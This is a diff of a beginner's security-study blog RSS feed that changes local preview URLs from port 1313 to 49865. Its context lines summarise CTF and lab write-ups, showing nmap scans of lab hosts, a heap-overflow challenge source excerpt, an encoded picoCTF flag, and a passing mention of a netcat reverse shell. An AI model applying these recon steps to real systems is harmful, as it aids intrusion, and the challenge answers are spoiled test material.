-      <link>http://localhost:1313/htb-three/</link>
+      <link>http://localhost:49865/htb-three/</link>
       <pubDate>Sun, 14 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-three/</guid>
+      <guid>http://localhost:49865/htb-three/</guid>
       <description>As I have mentioned earlier from the previous posting, I&amp;rsquo;ve finished all the boxes in Hack The Box Starting Point Tier 0 and have moved on to Tier 1 boxes. However, I feel a bit overwhelmed because the difficulty has suddenly increased a lot. To be clear, I want to mention that I will likely rely somewhat on the official write-ups provided by Hack The Box, including for this write-up and for future boxes.</description>
       <content:encoded><![CDATA[<div style="text-align:center;"><img src="./sohard.gif"></div>
 <p>As I have mentioned earlier from the previous posting, I&rsquo;ve finished all the boxes in Hack The Box Starting Point Tier 0 and have moved on to Tier 1 boxes. However, I feel a bit overwhelmed because the difficulty has suddenly increased a lot. To be clear, I want to mention that I will likely rely somewhat on the official write-ups provided by Hack The Box, including for this write-up and for future boxes. As a beginner, it&rsquo;s quite challenging and time-consuming to complete boxes of this level without any assistance, so I&rsquo;ve concluded that it&rsquo;s better to get some help now and try to solve them on my own again later.</p>
@@ -1591,9 +1785,9 @@ Let&rsquo;s visit the following URL containing the payload in the browser.</p>
     </item>
     <item>
       <title>[HTB] Crocodile</title>
-      <link>http://localhost:1313/htb-crocodile/</link>
+      <link>http://localhost:49865/htb-crocodile/</link>
       <pubDate>Sat, 13 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-crocodile/</guid>
+      <guid>http://localhost:49865/htb-crocodile/</guid>
       <description>What Nmap scanning switch employs the use of default scripts during a scan? -sC What service version is found to be running on port 21? vsftpd 3.0.3 1┌──(kali㉿kali)-[~/Desktop] 2└─$ nmap -sC -sV 10.129.60.250 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-13 00:54 EDT 4Nmap scan report for 10.129.60.250 5Host is up (0.034s latency). 6Not shown: 998 closed tcp ports (conn-refused) 7PORT STATE SERVICE VERSION 821/tcp open ftp vsftpd 3.0.3 9| ftp-syst: 10| STAT: 11| FTP server status: 12| Connected to ::ffff:10.</description>
       <content:encoded><![CDATA[<h4 id="what-nmap-scanning-switch-employs-the-use-of-default-scripts-during-a-scan">What Nmap scanning switch employs the use of default scripts during a scan?</h4>
 
@@ -1799,9 +1993,9 @@ Let&rsquo;s visit the following URL containing the payload in the browser.</p>
     </item>
     <item>
       <title>[HTB] Responder</title>
-      <link>http://localhost:1313/htb-responder/</link>
+      <link>http://localhost:49865/htb-responder/</link>
       <pubDate>Sat, 13 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-responder/</guid>
+      <guid>http://localhost:49865/htb-responder/</guid>
       <description>When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb The website has redirected the browser to a new URL, and my host doesn&amp;rsquo;t know how to find unika.htb. This webserver is employing name-based Virtual Hosting for serving the requests.
 Name-Based Virtual Hosting is a method for hosting multiple domain names on a single server. The web server checks the domain name provided in the Host header field of the HTTP request and sends a response according to that.</description>
       <content:encoded><![CDATA[<h4 id="when-visiting-the-web-service-using-the-ip-address-what-is-the-domain-that-we-are-being-redirected-to">When visiting the web service using the IP address, what is the domain that we are being redirected to?</h4>
@@ -1973,9 +2167,9 @@ The file inclusion was made possible because in the backend the <code>include()<
     </item>
     <item>
       <title>[HTB] Sequel</title>
-      <link>http://localhost:1313/htb-sequel/</link>
+      <link>http://localhost:49865/htb-sequel/</link>
       <pubDate>Fri, 12 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-sequel/</guid>
+      <guid>http://localhost:49865/htb-sequel/</guid>
       <description>During our scan, which port do we find serving MySQL? 3306 1┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-0x7zvm1bat]─[~] 2└──╼ [★]$ nmap -sC -sV 10.129.50.55 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 23:56 CDT 4Nmap scan report for 10.129.50.55 5Host is up (0.0084s latency). 6Not shown: 65534 closed tcp ports (reset) 7PORT STATE SERVICE VERSION 83306/tcp open mysql? 9| mysql-info: 10| Protocol: 10 11| Version: 5.5.5-10.3.27-MariaDB-0+deb10u1 12| Thread ID: 66 13| Capabilities flags: 63486 14| Some Capabilities: Speaks41ProtocolOld, Support41Auth, SupportsTransactions, SupportsCompression, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, ODBCClient, DontAllowDatabaseTableColumn, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults 15| Status: Autocommit 16| Salt: 6&amp;#39;\|}}|xdny7D0ay_OOz 17|_ Auth Plugin Name: mysql_native_password 18 19Service detection performed.</description>
       <content:encoded><![CDATA[<h4 id="during-our-scan-which-port-do-we-find-serving-mysql">During our scan, which port do we find serving MySQL?</h4>
 
@@ -2174,9 +2368,9 @@ Then listed the tables belonged to the db by <code>show tables</code></p>
     </item>
     <item>
       <title>[THM] John The Ripper</title>
-      <link>http://localhost:1313/thm-john-the-ripper/</link>
+      <link>http://localhost:49865/thm-john-the-ripper/</link>
       <pubDate>Fri, 12 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-john-the-ripper/</guid>
+      <guid>http://localhost:49865/thm-john-the-ripper/</guid>
       <description>What are Hashes? A hash is a way of taking a piece of data any length and representing it in another form that is a fixed length. This masks the original value of the data. This is done by running the original through a hashing algorithm.
 What makes Hashes secure? Hashing functions are designed as one-way functions. It&amp;rsquo;s easy to calculate the vash value of a given input; however, it is very difficult to find the original input given the hash value.</description>
       <content:encoded><![CDATA[<h4 id="what-are-hashes">What are Hashes?</h4>
@@ -2630,9 +2824,9 @@ What makes Hashes secure? Hashing functions are designed as one-way functions. I
     </item>
     <item>
       <title>[HTB] Appointment</title>
-      <link>http://localhost:1313/htb-appointment/</link>
+      <link>http://localhost:49865/htb-appointment/</link>
       <pubDate>Thu, 11 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-appointment/</guid>
+      <guid>http://localhost:49865/htb-appointment/</guid>
       <description>I just finished Tier 0 of the Starting Point and now I&amp;rsquo;m moving on to Tier 1 boxes. These are still very easy level boxes, but we all start somewhere, and I&amp;rsquo;m enjoying every step of this process. That&amp;rsquo;s what matters hehe.
 What does the acronym SQL stand for? Structured Query Language What is one of the most common type of SQL vulnerabilities? SQL Injection What is the 2021 OWASP Top 10 classification for this vulnerability?</description>
       <content:encoded><![CDATA[<p>I just finished Tier 0 of the Starting Point and now I&rsquo;m moving on to Tier 1 boxes. These are still <code>very easy</code> level boxes, but we all start somewhere, and I&rsquo;m enjoying every step of this process. That&rsquo;s what matters hehe.</p>
@@ -2801,9 +2995,9 @@ What does the acronym SQL stand for? Structured Query Language What is one of th
     </item>
     <item>
       <title>[HTB] Synced</title>
-      <link>http://localhost:1313/htb-synced/</link>
+      <link>http://localhost:49865/htb-synced/</link>
       <pubDate>Thu, 11 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-synced/</guid>
+      <guid>http://localhost:49865/htb-synced/</guid>
       <description>What is the default port for rsync? 873 How many TCP ports are open on the remote host? 1 As always, started off by running the nmap scan on all ports and turned out there is only 1 open port on 873 and it&amp;rsquo;s rsync.
 1┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-wv2b0ymwtt]─[~] 2└──╼ [★]$ nmap -sC -sV 10.129.49.240 -p- 3Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-11 12:14 CDT 4Nmap scan report for 10.129.49.240 5Host is up (0.</description>
       <content:encoded><![CDATA[<h4 id="what-is-the-default-port-for-rsync">What is the default port for rsync?</h4>
@@ -2945,9 +3139,9 @@ When downloading the file to our local machine, make sure to remove the <strong>
     </item>
     <item>
       <title>[HTB] Mongod</title>
-      <link>http://localhost:1313/htb-mongod/</link>
+      <link>http://localhost:49865/htb-mongod/</link>
       <pubDate>Wed, 10 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-mongod/</guid>
+      <guid>http://localhost:49865/htb-mongod/</guid>
       <description>it&amp;rsquo;s been quite a while since I tackled any challenges on Hack The Box. My original plan was to strengthen my fundamentals on TryHackMe and then come back to Hack The Box. But now I&amp;rsquo;m thinking, why not do both at the same time? I can learn by diving in and trying things out as I go.
 How many TCP ports are open on the machine? 2 1┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-l3lgefdeyz]─[~] 2└──╼ [★]$ sudo nmap -sC -sV 10.</description>
       <content:encoded><![CDATA[<p>it&rsquo;s been quite a while since I tackled any challenges on Hack The Box. My original plan was to strengthen my fundamentals on TryHackMe and then come back to Hack The Box. But now I&rsquo;m thinking, why not do both at the same time? I can learn by diving in and trying things out as I go.</p>
@@ -3135,9 +3329,9 @@ How many TCP ports are open on the machine? 2 1┌─[us-starting-point-vip-1-dh
     </item>
     <item>
       <title>[picoCTF] CanYouSee</title>
-      <link>http://localhost:1313/picoctf-canyousee/</link>
+      <link>http://localhost:49865/picoctf-canyousee/</link>
       <pubDate>Tue, 09 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/picoctf-canyousee/</guid>
+      <guid>http://localhost:49865/picoctf-canyousee/</guid>
       <description>This one from picoCTF was fairly easy, so I was unsure about uploading it. However, there was a part that I wasn&amp;rsquo;t familiar with, and I learned something new. So, why not?
 Description How about some hide and seek?
 As usual, I started by downloading the provided file to my local machine by using the wget command.
@@ -3261,9 +3455,9 @@ As usual, I started by downloading the provided file to my local machine by usin
     </item>
     <item>
       <title>[THM] Pickle Rick</title>
-      <link>http://localhost:1313/thm-pickle-rick/</link>
+      <link>http://localhost:49865/thm-pickle-rick/</link>
       <pubDate>Tue, 09 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-pickle-rick/</guid>
+      <guid>http://localhost:49865/thm-pickle-rick/</guid>
       <description>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.
 Deploy the virtual machine on this task and explore the web application
 What is the first ingredient that Rick needs? mr. meeseek hair The first enumeration step I took was to run a nmap scan. In the meanwhile, I browsed the source code of the target website and found the following: username: R1ckRul3s, which implies that there&amp;rsquo;s going to be some sort of login webpage within the target website.</description>
@@ -3419,9 +3613,9 @@ Before running the reverse-shell command, I made sure I'm running the netcat in 
     </item>
     <item>
       <title>[picoCTF] packer</title>
-      <link>http://localhost:1313/picoctf-packer/</link>
+      <link>http://localhost:49865/picoctf-packer/</link>
       <pubDate>Mon, 08 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/picoctf-packer/</guid>
+      <guid>http://localhost:49865/picoctf-packer/</guid>
       <description>Description Reverse this linux executable?
 First, I downloaded the file to my local machine using the wget comand.
 wget https://artifacts.picoctf.net/c_titan/103/out
@@ -3519,9 +3713,9 @@ It seems like a binary file that contains non-human readable contents inside it
     </item>
     <item>
       <title>[picoCTF] Secret of the Polyglot</title>
-      <link>http://localhost:1313/picoctf-secret-of-the-polyglot/</link>
+      <link>http://localhost:49865/picoctf-secret-of-the-polyglot/</link>
       <pubDate>Sun, 07 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/picoctf-secret-of-the-polyglot/</guid>
+      <guid>http://localhost:49865/picoctf-secret-of-the-polyglot/</guid>
       <description>Description The Network Operations Center (NOC) of your local institution picked up a suspicious file, they&amp;rsquo;re getting conflicting information on what type of file it is. They&amp;rsquo;ve brought you in as an external expert to examine the file. Can you extract all the information from this strange file? Download the suspicious file.
 First, I downloaded the provided file on my Kali Linux VM by the follwing command: wget https://artifacts.picoctf.net/c_titan/9/flag2of2-final.pdf
 The name of the file is flag2of2-final.</description>
@@ -3559,9 +3753,9 @@ Download the suspicious file.</p>
     </item>
     <item>
       <title>[picoCTF] Time Machine</title>
-      <link>http://localhost:1313/picoctf-time-machine/</link>
+      <link>http://localhost:49865/picoctf-time-machine/</link>
       <pubDate>Sun, 07 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/picoctf-time-machine/</guid>
+      <guid>http://localhost:49865/picoctf-time-machine/</guid>
       <description>Description What was I last working on? I remember writing a note to help me remember&amp;hellip; You can download the challenge files here: challenge.zip
 First, let&amp;rsquo;s download the provided .zip file on our terminal by running the following command:
 wget https://artifacts.picoctf.net/c_titan/160/challenge.zip
@@ -3676,9 +3870,9 @@ Let&rsquo;s run <code>ls -la</code> command to reveal all the hidden files.</p>
     </item>
     <item>
       <title>[picoCTF] WebDecode</title>
-      <link>http://localhost:1313/picoctf-webdecode/</link>
+      <link>http://localhost:49865/picoctf-webdecode/</link>
       <pubDate>Sat, 06 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/picoctf-webdecode/</guid>
+      <guid>http://localhost:49865/picoctf-webdecode/</guid>
       <description>Description Do you know how to use the web inspector? Start searching here to find the flag
 If you click on the link provided, it takes you to a website. There&amp;rsquo;s a navbar at the top with three options, home, about, and contact If you navigate to the about page, it says Try inspecting the page!! You might find it there.
 When you inspect the elements of the page, you&amp;rsquo;ll notice that the section tag has an attribute called notify_true=&amp;quot;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMjgzZTYyZmV9&amp;quot;.</description>
@@ -3705,9 +3899,9 @@ When you inspect the elements of the page, you&rsquo;ll notice that the section 
     </item>
     <item>
       <title>[THM] Upload Vulnerabilities</title>
-      <link>http://localhost:1313/thm-upload-vulnerabilities/</link>
+      <link>http://localhost:49865/thm-upload-vulnerabilities/</link>
       <pubDate>Sat, 06 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-upload-vulnerabilities/</guid>
+      <guid>http://localhost:49865/thm-upload-vulnerabilities/</guid>
       <description>The ability to upload files to a server has become an integral part of how we interact with web applications. Unfortunately, when handled badly, file uploads can also open up severe vulnerabilities in the server.
 Overwriting Existing Files Open your web browser and navigate to overwrite.uploadvulns.thm. Your goal is to overwrite a file on the server with an upload of your own.
 What is the name of the image file which can be overwritten?</description>
@@ -4170,9 +4364,9 @@ What is the name of the image file which can be overwritten?</description>
     </item>
     <item>
       <title>[picoCTF] Binary Search</title>
-      <link>http://localhost:1313/picoctf-binary-search/</link>
+      <link>http://localhost:49865/picoctf-binary-search/</link>
       <pubDate>Fri, 05 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/picoctf-binary-search/</guid>
+      <guid>http://localhost:49865/picoctf-binary-search/</guid>
       <description>Binary Search Description Want to play a game? As you use more of the shell, you might be interested in how they work! Binary search is a classic algorithm used to quickly find an item in a sorted list. Can you find the flag? You&amp;rsquo;ll have 1000 possibilities and only 10 guesses. Cyber security often has a huge amount of data to look through - from logs, vulnerability reports, and forensics.</description>
       <content:encoded><![CDATA[<h3 id="binary-search">Binary Search</h3>
 <h4 id="description">Description</h4>
@@ -4212,9 +4406,9 @@ Majoring in Computer Science finally paid off.. 😭</p>
     </item>
     <item>
       <title>[picoCTF] heap 1 &amp; heap 0</title>
-      <link>http://localhost:1313/picoctf-heap-0-1/</link>
+      <link>http://localhost:49865/picoctf-heap-0-1/</link>
       <pubDate>Fri, 05 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/picoctf-heap-0-1/</guid>
+      <guid>http://localhost:49865/picoctf-heap-0-1/</guid>
       <description>heap 0 Description Are overflows just a stack concern? Download the binary Download the source Here&amp;rsquo;s the source code provided
 1#include &amp;lt;stdio.h&amp;gt; 2#include &amp;lt;stdlib.h&amp;gt; 3#include &amp;lt;string.h&amp;gt; 4 5#define FLAGSIZE_MAX 64 6// amount of memory allocated for input_data 7#define INPUT_DATA_SIZE 5 8// amount of memory allocated for safe_var 9#define SAFE_VAR_SIZE 5 10 11int num_allocs; 12char *safe_var; 13char *input_data; 14 15void check_win() { 16 if (strcmp(safe_var, &amp;#34;bico&amp;#34;) != 0) { 17 printf(&amp;#34;\nYOU WIN\n&amp;#34;); 18 19 // Print flag 20 char buf[FLAGSIZE_MAX]; 21 FILE *fd = fopen(&amp;#34;flag.</description>
       <content:encoded><![CDATA[<h3 id="heap-0">heap 0</h3>
@@ -4614,9 +4808,9 @@ Here's the solution:
     </item>
     <item>
       <title>[picoCTF] Scan Surprise</title>
-      <link>http://localhost:1313/picoctf-scan-surprise/</link>
+      <link>http://localhost:49865/picoctf-scan-surprise/</link>
       <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/picoctf-scan-surprise/</guid>
+      <guid>http://localhost:49865/picoctf-scan-surprise/</guid>
       <description>Description I&amp;rsquo;ve gotton bored of handing out flags as text. Wouldn&amp;rsquo;t it be cool if they were an image instead?
 This is what wee see when we first log into the ssh server, a QR code. The one thing we could easily do to capture the flag is to scan the QR code with our mobile phones since they have included native QR code scanner in their cameras since version 8 and iOS 11.</description>
       <content:encoded><![CDATA[<h3 id="description">Description</h3>
@@ -4638,9 +4832,9 @@ Wouldn&rsquo;t it be cool if they were an image instead?</p>
     </item>
     <item>
       <title>[picoCTF] Verify</title>
-      <link>http://localhost:1313/picoctf-verify/</link>
+      <link>http://localhost:49865/picoctf-verify/</link>
       <pubDate>Thu, 04 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/picoctf-verify/</guid>
+      <guid>http://localhost:49865/picoctf-verify/</guid>
       <description>Happy 4th of July
 This is my first time experiencing picoCTF. I had heard of it numerous times on the Internet, and it turned out to be way more fun and engaging than I expected. I think I’ll stick to picoCTF for a while before moving on to HackTheBox, as I feel picoCTF provides more basic and foundational CTFs than HTB. Anyway, I&amp;rsquo;m really glad I stumbled upon this resource and decided to give it a try.</description>
       <content:encoded><![CDATA[<div style="text-align: center"><img src="./giphy.gif"></div>
@@ -4714,9 +4908,9 @@ This is my first time experiencing picoCTF. I had heard of it numerous times on 
     </item>
     <item>
       <title>[THM] OWASP Juice Shop</title>
-      <link>http://localhost:1313/thm-owasp-juice-shop/</link>
+      <link>http://localhost:49865/thm-owasp-juice-shop/</link>
       <pubDate>Wed, 03 Jul 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-owasp-juice-shop/</guid>
+      <guid>http://localhost:49865/thm-owasp-juice-shop/</guid>
       <description>We will look at OWASP&amp;rsquo;s TOP 10 vulnerabilities in web applications. But for this, we will be looking at OWASP&amp;rsquo;s own creation, Juice Shop.
 Question #1: What&amp;rsquo;s the Administrator&amp;rsquo;s email address? admin@juice-sh.op Question #2: What parameter is used for searching? q When I typed asdfsdf on the search bar, I noticed that the URL changed to http://10.10.113.37/#/search?q=asdfsdf. we can see that the parameter is q.
 Question #3: What show does Jim reference in his review?</description>
@@ -4912,9 +5106,9 @@ From there you will see a &lsquo;Truck&rsquo; icon, clicking on that will bring 
     </item>
     <item>
       <title>[THM] OWASP Top 10 (2021)</title>
-      <link>http://localhost:1313/thm-owasp-top-10/</link>
+      <link>http://localhost:49865/thm-owasp-top-10/</link>
       <pubDate>Sun, 30 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-owasp-top-10/</guid>
+      <guid>http://localhost:49865/thm-owasp-top-10/</guid>
       <description>What is OWASP? The Open Web Application Security Project, or OWASP, is an international non-profit organization dedicated to web application security. One of OWASP&amp;rsquo;s core principles is that all of their materials be freely available and easily accessible on their website, making it possible for anyone to improve their own web application security.
 What is OWASP Top 10? The OWASP Top 10 is a regularly-updated report outlining security concerns for web application security, focusing on the 10 most critical risks.</description>
       <content:encoded><![CDATA[<h3 id="what-is-owasp">What is OWASP?</h3>
@@ -5460,9 +5654,9 @@ JWT token is formed of 3 parts: <code>Header</code>, <code>Payload</code> and <c
     </item>
     <item>
       <title>[TIL] VLSM</title>
-      <link>http://localhost:1313/til-vlsm/</link>
+      <link>http://localhost:49865/til-vlsm/</link>
       <pubDate>Thu, 27 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/til-vlsm/</guid>
+      <guid>http://localhost:49865/til-vlsm/</guid>
       <description>VLSM (Variable-Length Subnet Masks) Until now, I have practiced subnetting used FLSM (Fixed-Length Subnet Masks). This means that all of the subnets use the same prefix length (ie. subnetting a Class C network into 4 subnets using /26).
 VLSM (Variable-Length Subnet Masks) is the process of creating subnets of different sizes, to make your use of network addresses more efficient.
 Here&amp;rsquo;s an example of a small enterprise network. There are two LANs in Tokyo and two LANs in Toronto.</description>
@@ -5738,9 +5932,9 @@ Last usable address: 192.168.5.226/30</code></pre>
     </item>
     <item>
       <title>[THM] Network Services 2</title>
-      <link>http://localhost:1313/thm-network-services-2/</link>
+      <link>http://localhost:49865/thm-network-services-2/</link>
       <pubDate>Wed, 26 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-network-services-2/</guid>
+      <guid>http://localhost:49865/thm-network-services-2/</guid>
       <description>This is the second series on Network Services in the Network Exploitation Basics module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.
 NFS Understanding NFS What does NFS stand for?
 Network File System What process allows an NFS client to interact with a remote directory as though it was a physical drive?
@@ -7119,9 +7313,9 @@ What is the user/hash combination string?</p>
     </item>
     <item>
       <title>[TIL] Subnetting 2</title>
-      <link>http://localhost:1313/til-subnetting-2/</link>
+      <link>http://localhost:49865/til-subnetting-2/</link>
       <pubDate>Wed, 26 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/til-subnetting-2/</guid>
+      <guid>http://localhost:49865/til-subnetting-2/</guid>
       <description>Divide the 192.168.1.0/24 network into 4 subnets that can accommodate 45 number of hosts.
 First, we determined that the prefix length needs to be /26 because each subnet must be able to include 45 hosts. The formula to calculate the number of hosts is 2^n - 2, where n is the number of host bits. If there are 5 host bits, then 2^5 - 2 = 30, which is not enough to include 45 hosts.</description>
       <content:encoded><![CDATA[<div style="text-align: center"><img src="./image-30.png"></div>
@@ -7272,9 +7466,9 @@ broadcast address: 172.16.127.255/18</code></pre>
     </item>
     <item>
       <title>[TIL] Subnetting</title>
-      <link>http://localhost:1313/til-subnetting-1/</link>
+      <link>http://localhost:49865/til-subnetting-1/</link>
       <pubDate>Tue, 25 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/til-subnetting-1/</guid>
+      <guid>http://localhost:49865/til-subnetting-1/</guid>
       <description>Today marks day 13 of studying CCNA with Jeremy&amp;rsquo;s IT Lab. Today&amp;rsquo;s topic was subnetting. Even though the topic was challenging to grasp at first, it&amp;rsquo;s really interesting how people came up with such ideas to efficiently utilize the IP addressing system. People are geniuses!
 IPv4 Address Classes There are 5 different IPv4 classes
 A subnet refers to a portioned network within an IP address that divides the network area. The tool used to create these subnets is called a Subnet Mask.</description>
@@ -7321,9 +7515,9 @@ Earlier, we mentioned that <code>/30</code> is a subnet of the <code>/24</code> 
     </item>
     <item>
       <title>[THM] Network Services</title>
-      <link>http://localhost:1313/thm-network-services/</link>
+      <link>http://localhost:49865/thm-network-services/</link>
       <pubDate>Mon, 24 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/thm-network-services/</guid>
+      <guid>http://localhost:49865/thm-network-services/</guid>
       <description>I have been indecisive about choosing between TryHackMe and Hack The Box Academy. Both are great platforms for learning about cybersecurity, and I plan to use both. However, I think TryHackMe is more suitable for absolute beginners like me. While exploring their Network Services rooms, I found myself learning a lot, so I decided to make a post about them.
 SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?</description>
       <content:encoded><![CDATA[<p>I have been indecisive about choosing between TryHackMe and Hack The Box Academy. Both are great platforms for learning about cybersecurity, and I plan to use both. However, I think TryHackMe is more suitable for absolute beginners like me. While exploring their Network Services rooms, I found myself learning a lot, so I decided to make a post about them.</p>
@@ -8173,9 +8367,9 @@ SMB default ports are <code>139 or 445</code></p>
     </item>
     <item>
       <title>[TIL] Life of a Packet</title>
-      <link>http://localhost:1313/til-life-of-a-packet/</link>
+      <link>http://localhost:49865/til-life-of-a-packet/</link>
       <pubDate>Mon, 24 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/til-life-of-a-packet/</guid>
+      <guid>http://localhost:49865/til-life-of-a-packet/</guid>
       <description>Today, while studying for my CCNA with Jeremy&amp;rsquo;s IT Lab YouTube videos, I learned something very useful that I can&amp;rsquo;t help but write about because I want to remember it for a long time and make the knowledge mine.
 The image below is the network topology used in the Lab.
 PC1 pings PC4.
@@ -8331,9 +8525,9 @@ Destination MAC address: 4444</code></pre>
     </item>
     <item>
       <title>[TIL] Port</title>
-      <link>http://localhost:1313/til-port/</link>
+      <link>http://localhost:49865/til-port/</link>
       <pubDate>Fri, 21 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/til-port/</guid>
+      <guid>http://localhost:49865/til-port/</guid>
       <description>I feel like I&amp;rsquo;ve only scratched the surface when it comes to understanding Ports. Since I have an interview coming up, I want to review the basics of Ports, even if it&amp;rsquo;s very fundamental.
 What is a port? From Wikipedia
 a port is a number assigned to uniquely identify a connection endpoint and to direct data to a specific service.
@@ -8364,9 +8558,9 @@ To simply put, a port is like an address for a specific program or service runni
     </item>
     <item>
       <title>[HTB] Redeemer</title>
-      <link>http://localhost:1313/htb-redeemer/</link>
+      <link>http://localhost:49865/htb-redeemer/</link>
       <pubDate>Tue, 18 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-redeemer/</guid>
+      <guid>http://localhost:49865/htb-redeemer/</guid>
       <description>some thoughts:
 This box was the most challenging one to crack so far, but I feel incredibly accomplished seeing my progress. I really enjoy writing about my experiences in this personal space, even though no one else is seeing it. I&amp;rsquo;m practicing not to rely on external sources unless I&amp;rsquo;ve tried everything I can on my own, and I&amp;rsquo;m really glad I&amp;rsquo;ve decided to do so. Working on this box has made me feel like I&amp;rsquo;m going to remember every step I took to get the flag.</description>
       <content:encoded><![CDATA[<p>some thoughts:</p>
@@ -8604,9 +8798,9 @@ This box was the most challenging one to crack so far, but I feel incredibly acc
     </item>
     <item>
       <title>[TIL] Explosion</title>
-      <link>http://localhost:1313/htb-explosion/</link>
+      <link>http://localhost:49865/htb-explosion/</link>
       <pubDate>Tue, 18 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/htb-explosion/</guid>
+      <guid>http://localhost:49865/htb-explosion/</guid>
       <description>some thoughts:
 It was really fascinating when I first tried connecting to an RDP server. I just typed a few appropriate commands in the terminal CLI, and suddenly a small screen popped up over the terminal, displaying the Windows desktop screen. It might seem like no big deal to some, but for me, it was an amazing experience. It showed me how powerful these commands and knowing various server protocols can be.</description>
       <content:encoded><![CDATA[<p>some thoughts:</p>
@@ -8743,9 +8937,9 @@ The final command <code>xfreerdp /v:10.129.1.13 /cert-ignore /u:Administrator</c
     </item>
     <item>
       <title>[TIL] Routing</title>
-      <link>http://localhost:1313/til-routing/</link>
+      <link>http://localhost:49865/til-routing/</link>
       <pubDate>Tue, 18 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
-      <guid>http://localhost:1313/til-routing/</guid>
+      <guid>http://localhost:49865/til-routing/</guid>
       <description>I&amp;rsquo;m currently studying for the CCNA exam, primarily using Jeremy&amp;rsquo;s IT Lab YouTube channel. He&amp;rsquo;s well-known for providing great CCNA content, and the best part is that it&amp;rsquo;s all free on YouTube. Jeremy also offers Anki flashcards, which I absolutely love and use daily, as well as Cisco Packet Tracer, which is an excellent resource for hands-on practice. I plan to take the exam in 3 to 4 months, though this timeline might change depending on my study and preparation progress.</description>
       <content:encoded><![CDATA[<p>I&rsquo;m currently studying for the CCNA exam, primarily using Jeremy&rsquo;s IT Lab YouTube channel. He&rsquo;s well-known for providing great CCNA content, and the best part is that it&rsquo;s all free on YouTube. Jeremy also offers Anki flashcards, which I absolutely love and use daily, as well as Cisco Packet Tracer, which is an excellent resource for hands-on practice. I plan to take the exam in 3 to 4 months, though this timeline might change depending on my study and preparation progress.</p>
 <p>Today, I learned about routing.</p>
@@ -8815,9 +9009,9 @@ But before we go into routing methods,</p>
     </item>
     <item>
       <title>[HTB] Dancing</title>
